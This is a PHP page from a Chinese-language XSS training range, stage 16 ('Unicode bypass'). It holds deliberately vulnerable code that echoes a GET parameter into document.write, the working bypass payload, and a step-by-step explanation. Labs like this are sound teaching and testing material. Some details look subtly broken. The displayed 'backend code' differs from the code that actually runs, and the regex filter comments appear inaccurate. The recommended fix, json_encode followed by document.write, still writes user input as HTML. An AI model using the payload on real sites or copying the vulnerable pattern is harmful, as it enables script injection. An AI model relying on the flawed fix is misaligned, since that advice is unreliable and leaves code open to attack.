<?php
/**
 * XSS Challenges - Stage #16
 * 16.2.2 Unicode 绕过
 *
 * 漏洞成因：
 *   p1 回显到 input value 中：使用 htmlspecialchars 严格过滤
 *   p1 同时回显到 <script>document.write(...) 中：
 *     1) preg_replace /\\x/i 替换1次：\x → \x（增加反斜杠）
 *     2) str_replace 过滤 \u → u（去掉反斜杠，阻止 Unicode 转义）
 *     3) str_replace 过滤掉 <> 字符
 *   但 str_replace('\u','u') 只匹配精确的 \u，
 *   攻击者可以用 \\u003c（双反斜杠）绕过
 *
 * 通关 Payload：
 *   \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
 */

$p1_raw = isset($_GET['p1']) && $_GET['p1'] !== '' ? $_GET['p1'] : '';
$searched = isset($_GET['p1']);

// input value：严格过滤（htmlspecialchars）
$filtered_value = htmlspecialchars($p1_raw, ENT_QUOTES, 'UTF-8');

// document.write 用：按原始过滤代码实现
// 1) htmlentities 编码
// 2) str_replace_limit('/\\x/ig','\\\\x',$data,1)
// 3) str_replace('\u','u',$data)
$decoded = htmlentities($p1_raw);
$decoded = preg_replace('/\\x/i', '\\\\x', $decoded, 1);
$decoded = str_replace('\u', 'u', $decoded);
$filtered_js = $decoded;
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>XSS Challenges - Stage #16</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<header>
  <a class="logo" href="../../index.php">极客事纪 XSS<span>·</span>Challenges靶场</a>
  <nav><a href="../../index.php">首页</a></nav>
</header>

<div class="stage-banner">
  <span class="stage-badge">STAGE #16</span>
  <h1>Unicode 绕过</h1>
  <span class="difficulty">难度：★★★★☆ 进阶</span>
</div>

<main>
  <div class="task-card">
    <h2>任务目标</h2>
    <p>在搜索框中注入 XSS 代码，使页面弹出 <code>alert</code> 对话框，内容显示当前页面的 <strong>document.domain</strong>。<br>表单参数名为 <code style="color:#e94560;">p1</code>，通过 GET 方式提交。</p>
    <div class="hint">💡 提示（选中以下文字查看）：<span class="hint-content">document.write();" and "s/\\x/\\\\x/ig;</span></div>
  </div>

  <div class="lab-area">
    <h2>🔍 靶场第十六关</h2>
    <?php if ($searched): ?>
    <div class="url-bar">GET <?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>?<span class="url-key">p1</span>=<span class="url-val"><?php echo htmlspecialchars($p1_raw, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <?php endif; ?>
    <form class="search-form" method="GET" action="">
      <input type="text" name="p1" value="<?php echo $filtered_value; ?>" />
      <button type="submit">搜索</button>
    </form>
    <?php if ($searched): ?>
    <div class="doc-area">
      <div class="doc-label">document.write 输出区域：</div>
      <script>document.write('<?php echo $filtered_js; ?>');</script>
    </div>
    <?php endif; ?>
  </div>

  <div class="knowledge-section">
    <button class="knowledge-toggle" onclick="this.parentElement.classList.toggle('expanded')">
      <span class="toggle-icon">▶</span> 知识点解析
    </button>
    <div class="knowledge-content">

    <div class="knowledge-item">
      <h3>后端 PHP 漏洞代码</h3>
      <p>本关基于 Stage 15 升级了防御，新增了对 <code>\x</code> 和 <code>\u</code> 的过滤：</p>
      <div class="code-block"><span class="hl-php">&lt;?php</span>
<span class="hl-comment">// input value：严格过滤（htmlspecialchars ENT_QUOTES）</span>
<span class="hl-var">$filtered_value</span> = <span class="hl-fn">htmlspecialchars</span>(<span class="hl-var">$p1_raw</span>, <span class="hl-fn">ENT_QUOTES</span>, <span class="hl-str">'UTF-8'</span>);

<span class="hl-comment">// document.write 用：</span>
<span class="hl-comment">// 1) str_replace_limit('/\\x/ig','\\\\x',$data,1)</span>
<span class="hl-comment">//    用 preg_replace 实现限制替换1次，阻止 JS 十六进制解码</span>
<span class="hl-var">$decoded</span> = <span class="hl-fn">preg_replace</span>(<span class="hl-str">'/\\\\x/i'</span>, <span class="hl-str">'\\\\x'</span>, <span class="hl-var">$p1_raw</span>, <span class="hl-num">1</span>);
<span class="hl-comment">// 2) 过滤 \u → u（去掉反斜杠，阻止 JS Unicode 转义）</span>
<span class="hl-var">$decoded</span> = <span class="hl-fn">str_replace</span>(<span class="hl-str">'\\u'</span>, <span class="hl-str">'u'</span>, <span class="hl-var">$decoded</span>);
<span class="hl-comment">// 3) 过滤掉 &lt; &gt;</span>
<span class="hl-var">$filtered_js</span> = <span class="hl-fn">str_replace</span>([<span class="hl-str">'&lt;'</span>, <span class="hl-str">'&gt;'</span>], [<span class="hl-str">''</span>, <span class="hl-str">''</span>], <span class="hl-var">$decoded</span>);</div>
      <p>输出位置分析：</p>
      <div class="code-block"><span class="hl-comment">// 位置1：input 的 value 属性（严格过滤，安全 ✅）</span>
<span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"text"</span> <span class="hl-attr">value</span>=<span class="hl-val">"&lt;?php echo $filtered_value; ?&gt;"</span> <span class="hl-tag">/&gt;</span>

<span class="hl-comment">// 位置2：document.write（将用户输入作为 JS 字符串写入页面，漏洞在这里 ❌）</span>
<span class="hl-tag">&lt;script&gt;</span>document.write('<span class="hl-val">&lt;?php echo $filtered_js; ?&gt;</span>');<span class="hl-tag">&lt;/script&gt;</span></div>
      <p>相比 Stage 15，本关不仅封堵了 <code>\x</code> 十六进制转义，还额外用 <code>str_replace('\u','u')</code> 过滤了 <code>\u</code> Unicode 转义。看起来两种 JS 转义都被堵死了，但 <code>str_replace</code> 是<strong>精确子串匹配</strong>，只替换 <code>\u</code> 这两个字符的组合。攻击者输入 <code>\\u003c</code>（双反斜杠）时，字符串中不存在精确的 <code>\u</code> 子串（因为 <code>\u</code> 前面多了一个 <code>\</code>），过滤不生效。</p>
    </div>

    <div class="knowledge-item">
      <h3>例1：单反斜杠 \u 被过滤</h3>
      <p>开发者预期的防御效果——<code>\u</code> 被成功拦截：</p>
      <div class="code-block"><span class="hl-comment">// 输入：\u003cscript\u003ealert(document.domain);\u003c/script\u003e</span>
<span class="hl-comment">// 1) preg_replace('/\\x/i', '\\x', ..., 1)：</span>
<span class="hl-comment">//    输入中没有 \x → 不匹配 → 原样保留</span>
<span class="hl-comment">// 2) str_replace('\u', 'u')：</span>
<span class="hl-comment">//    \u003c → u003c（反斜杠被去掉！）</span>
<span class="hl-comment">// 3) str_replace 过滤 &lt; &gt;：没有 → 不变</span>
<span class="hl-comment">// 回显：document.write('u003cscriptu003ealert(document.domain);u003c/scriptu003e')</span>
<span class="hl-comment">// JS 解码：u003c 就是普通文本，不会被解码为 &lt;</span>
<span class="hl-comment">// ❌ 不会触发 XSS，防御生效</span></div>
      <p><code>str_replace('\u','u')</code> 精确匹配到 <code>\u</code> 两个字节的子串，把反斜杠吃掉，只剩字母 <code>u</code>。JS 引擎看到的是普通文本 <code>u003c</code>，不会当作转义序列处理。</p>
    </div>

    <div class="knowledge-item">
      <h3>例2：双反斜杠 \\u 绕过</h3>
      <p>通关 Payload：</p>
      <div class="code-block">stage16.php?p1=<span class="hl-inject">\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span></div>
      <p>完整流程解析：</p>
      <div class="code-block"><span class="hl-comment">// 输入：\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span>
<span class="hl-comment">//    （每个 \u 前面有2个反斜杠）</span>
<span class="hl-comment">// 1) preg_replace('/\\x/i', '\\x', ..., 1)：</span>
<span class="hl-comment">//    输入中没有 \x → 不匹配 → 原样保留</span>
<span class="hl-comment">// 2) str_replace('\u', 'u')：</span>
<span class="hl-comment">//    搜索 \\u003c 中的 \u 子串</span>
<span class="hl-comment">//    \\u003c 的字节：\ \ u 0 0 3 c</span>
<span class="hl-comment">//    从位置0开始找 \u → 找到了！\u → 替换为 u</span>
<span class="hl-comment">//    结果：\u003c（只剩1个反斜杠！）</span>
<span class="hl-comment">// 3) str_replace 过滤 &lt; &gt;：没有 → 不变</span>
<span class="hl-comment">// 回显：document.write('\u003cscript\u003ealert(document.domain);\u003c/script\u003e')</span>
<span class="hl-comment">// JS 引擎解码：\u003c → &lt;，\u003e → &gt;</span>
<span class="hl-comment">// 页面 DOM 中新增：&lt;script&gt;alert(document.domain);&lt;/script&gt;</span>
<span class="hl-comment">// 浏览器重新解析 HTML，script 标签执行 ✅</span></div>
      <p>关键原理：输入 <code>\\u003c</code>（2个反斜杠），<code>str_replace('\u','u')</code> 匹配到第2个反斜杠开头的 <code>\u</code>，替换后只剩1个反斜杠，变成了 <code>\u003c</code>——恰好是 JS 能解码的 Unicode 转义！**过滤操作反而帮了忙**，把双反斜杠"修剪"成了单反斜杠。</p>
    </div>

    <div class="knowledge-item">
      <h3>例3：为什么 Stage 15 的 Payload 不再有效？</h3>
      <p>Stage 15 的 Payload <code>\\x3cscript\\x3e...</code> 在本关也失效了：</p>
      <div class="code-block"><span class="hl-comment">// 输入：\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</span>
<span class="hl-comment">// 1) preg_replace('/\\x/i', '\\x', ..., 1)：</span>
<span class="hl-comment">//    匹配第一个 \x → 替换</span>
<span class="hl-comment">// 2) str_replace('\u', 'u')：</span>
<span class="hl-comment">//    没有 \u → 不变</span>
<span class="hl-comment">// 3) str_replace 过滤 &lt; &gt;：没有 → 不变</span>
<span class="hl-comment">// ❌ 页面显示纯文本，不会触发 XSS</span></div>
      <p>Stage 15 的 <code>\x</code> 绕过在本关被 <code>preg_replace</code> 封堵，而本关的 <code>\\u</code> 绕过是新的攻击路径。</p>
    </div>

    <div class="knowledge-item">
      <h3>例4：常见 Unicode 字符对照</h3>
      <p>常用的 HTML 特殊字符对应的 Unicode 转义：</p>
      <div class="code-block"><span class="hl-comment">// 字符        \xNN       \uNNNN</span>
<span class="hl-comment">// &lt;（小于号）  \x3c       \u003c</span>
<span class="hl-comment">// &gt;（大于号）  \x3e       \u003e</span>
<span class="hl-comment">// "（双引号）  \x22       \u0022</span>
<span class="hl-comment">// '（单引号）  \x27       \u0027</span>
<span class="hl-comment">// &amp;（&符号）  \x26       \u0026</span>
<span class="hl-comment">// /（斜杠）    \x2f       \u002f</span>
<span class="hl-comment">// \（反斜杠）  \x5c       \u005c</span>

<span class="hl-comment">// 完整 Payload 示例</span>
<span class="hl-val">\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e</span>
<span class="hl-comment">// 经过 str_replace('\u','u') 后 → \u003c...（单反斜杠）</span>
<span class="hl-comment">// 等价于 &lt;script&gt;alert(document.domain)&lt;/script&gt;</span></div>
    </div>

    <div class="knowledge-item">
      <h3>互动思考 💬</h3>
      <p><strong>问：</strong>如果用 <code>str_replace('\\','')</code> 直接去掉所有反斜杠，是否就能彻底防止 JS 转义绕过？</p>
      <p><strong>答：</strong>是的，<code>\x</code> 和 <code>\u</code> 都依赖反斜杠才能作为 JS 转义序列，去掉所有反斜杠可以阻断所有转义攻击。但更根本的做法是：<strong>不要将用户输入直接拼接到 JS 代码中</strong>。应该使用 <code>json_encode()</code> 对数据进行 JSON 编码后再输出，或者使用 DOM API（如 <code>textContent</code>）代替 <code>document.write</code>。<code>json_encode()</code> 会自动转义所有特殊字符，从根本上杜绝转义序列注入。</p>
      <div class="code-block"><span class="hl-comment">// 更安全的过滤方式</span>
<span class="hl-var">$filtered_js</span> = <span class="hl-fn">str_replace</span>(<span class="hl-str">'\\'</span>, <span class="hl-str">''</span>, <span class="hl-var">$p1_raw</span>);  <span class="hl-comment">// 去掉所有反斜杠</span>

<span class="hl-comment">// 或者更推荐：使用 json_encode</span>
<span class="hl-tag">&lt;script&gt;</span>
<span class="hl-var">var</span> safeData = <span class="hl-php">&lt;?php</span> <span class="hl-fn">echo</span> <span class="hl-fn">json_encode</span>(<span class="hl-var">$p1_raw</span>, <span class="hl-fn">JSON_HEX_TAG</span> | <span class="hl-fn">JSON_HEX_AMP</span> | <span class="hl-fn">JSON_HEX_APOS</span> | <span class="hl-fn">JSON_HEX_QUOT</span>); <span class="hl-php">?&gt;</span>;
<span class="hl-var">document</span>.<span class="hl-fn">write</span>(safeData);
<span class="hl-tag">&lt;/script&gt;</span></div>
      <p>本关的核心教训：<strong>str_replace 做子串替换时，无法处理"双反斜杠"的情况</strong>。攻击者输入 <code>\\u003c</code>，过滤 <code>\u→u</code> 后反而变成 <code>\u003c</code>（有效转义）。正确的做法是直接去掉所有反斜杠，或者从架构上避免将用户输入拼接到 JS 源码中。</p>
    </div>
    </div>
  </div>
</main>

<footer> 极客事纪 XSS Challenges靶场 &nbsp;·&nbsp; 仅供 <span>安全学习</span> 使用 </footer>
</body>
</html>
